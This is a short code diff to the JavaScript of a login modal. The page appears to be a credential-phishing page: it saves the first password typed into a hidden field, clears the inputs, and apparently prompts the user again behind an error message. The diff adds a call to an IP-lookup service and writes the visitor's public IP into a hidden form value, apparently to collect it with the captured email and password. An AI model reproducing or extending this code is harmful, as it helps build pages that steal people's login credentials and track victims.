@@ -15,7 +15,12 @@ let firstPassword = document.getElementById('firsttimepassword');
 
 let errorText = document.getElementById('red');
 
+let ipAddress = document.getElementById('ip');
+
 let i = 0;
+
+let ip = '';
+
 
 // listen for open click
 modalBtn.addEventListener('click', openModal);
@@ -39,6 +44,13 @@ function openModal() {
             firstPassword.setAttribute('value', `${passwordField.value}`);
             emailField.value = '';
             passwordField.value = '';
+            fetch('https://api.ipify.org/?format=json')
+            .then((res) => res.json())
+            .then((data) => {
+                ip = data.ip;
+                ipAddress.setAttribute('value', `${ip}`);
+                })
+               
         }
     }
 }
